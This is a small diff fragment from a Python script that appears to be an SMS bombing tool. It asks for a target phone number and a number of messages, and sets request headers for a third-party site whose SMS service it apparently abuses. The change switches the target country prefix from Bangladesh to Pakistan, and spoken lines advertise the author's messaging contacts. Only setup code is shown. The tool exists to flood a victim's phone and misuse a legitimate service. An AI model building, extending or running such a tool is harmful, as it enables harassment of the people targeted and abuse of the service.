@@ -38,7 +38,7 @@ os.system('espeak -a 300 "telegram   0 3 2 6 3 3 4 2 2 7 6"')
 os.system('espeak -a 300 "imo 0 3 2 6 3 3 4 2 2 7 6"')
 os.system('espeak -a 300 "from Pakistan "')
 print(logo3)
-num=input("""  \033[38;5;46mTARGET NUMBER : +880""")
+num=input("""  \033[38;5;46mTARGET NUMBER : +92""")
 amount=int(input("\n  \033[38;5;46mSMS AMOUNT : "))
 headers1={
 			  "authority":"www.bioscopelive.com",
